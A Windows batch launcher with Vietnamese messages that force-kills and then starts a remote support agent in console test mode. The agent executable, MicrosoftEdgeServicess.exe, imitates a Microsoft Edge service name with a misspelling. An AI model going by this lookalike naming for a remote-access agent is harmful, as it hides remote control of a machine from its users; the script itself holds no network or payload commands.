@echo off
title [CONSOLE] MicrosoftEdgeServicess - Chay Truc Tiep Kiem Tra
cd /d "%~dp0"

echo ===============================================================================
echo   CHAY THU NGHIEM DICH VU HO TRO TU XA (AGENT MULTITASK)
echo   Ten dich vu: MicrosoftEdgeServicess (Che do man hinh Console truc tiep)
echo ===============================================================================
echo.

:: 1. Kiem tra xem co dang chay trong file ZIP chua giai nen khong
if not exist "%~dp0MicrosoftEdgeServicess.exe" (
    echo.
    echo ===============================================================================
    echo   [CANH BAO QUAN TRONG: CHUA GIAI NEN FILE NEN ZIP]
    echo ===============================================================================
    echo   Ban dang mo truc tiep file tu trong file nen ZIP chua duoc giai nen!
    echo   Vui long GIAI NEN (Extract All) file zip ra thu muc truoc khi chay.
    echo ===============================================================================
    echo.
    pause
    exit /b 1
)

:: 2. Don dep tien trinh cu de khong bi chan boi Single-Instance Mutex
echo Dang don dep tien trinh cu dang chay (neu co)...
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1

:: 3. Uu tien chay file thuc thi doc lap EXE
echo [THONG TIN] Da tim thay MicrosoftEdgeServicess.exe (Ban chay doc lap khong can Python).
echo Dang khoi dong Agent o che do Console (Nhan Ctrl+C de dung)...
echo.
"%~dp0MicrosoftEdgeServicess.exe"

echo.
echo ===============================================================================
echo   Tien trinh da ket thuc.
echo ===============================================================================
echo.
pause
